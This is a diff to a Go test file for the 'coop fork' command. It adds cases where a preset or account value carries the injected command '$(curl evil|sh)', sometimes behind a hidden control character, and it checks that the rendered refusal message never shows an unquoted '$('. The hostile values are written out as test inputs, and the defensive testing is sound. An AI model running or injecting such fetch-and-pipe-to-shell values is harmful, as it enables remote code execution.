@@ -268,6 +268,9 @@ func TestIsolatedRefusalLoopErrorKeepsTheForkTarget(t *testing.T) {
 		{"preset", "claude", "claude", "frontier", "coop fork i frontier --isolated"},
 		{"unparsable target", "claude", "claude@a@b", "", "coop fork i claude --isolated"},
 		{"shell characters", "claude", "claude:x;y@me", "", "coop fork i 'claude:x;y@me' --isolated"},
+		{"hostile preset", "claude", "claude@me", "p\x7f$(curl evil|sh)", "coop fork i claude@me --isolated"},
+		{"hostile preset without a hidden character", "claude", "claude@me", "p$(curl evil|sh)", "coop fork i claude@me --isolated"},
+		{"hidden character in the account", "claude", "claude@me\x7f$(curl evil|sh)", "", "coop fork i <value> --isolated"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			ws := t.TempDir()
@@ -282,6 +285,9 @@ func TestIsolatedRefusalLoopErrorKeepsTheForkTarget(t *testing.T) {
 			}
 			if !slices.Contains(block.Rows, [2]string{"Then start a new isolated fork from main:", tc.want}) {
 				t.Fatalf("rows %q, want the start command %q", block.Rows, tc.want)
+			}
+			if rendered := block.Render(ui.Palette{}); strings.Contains(rendered, "$(") {
+				t.Fatalf("the refusal prints an unquoted $( from the fork's notes:\n%s", rendered)
 			}
 		})
 	}
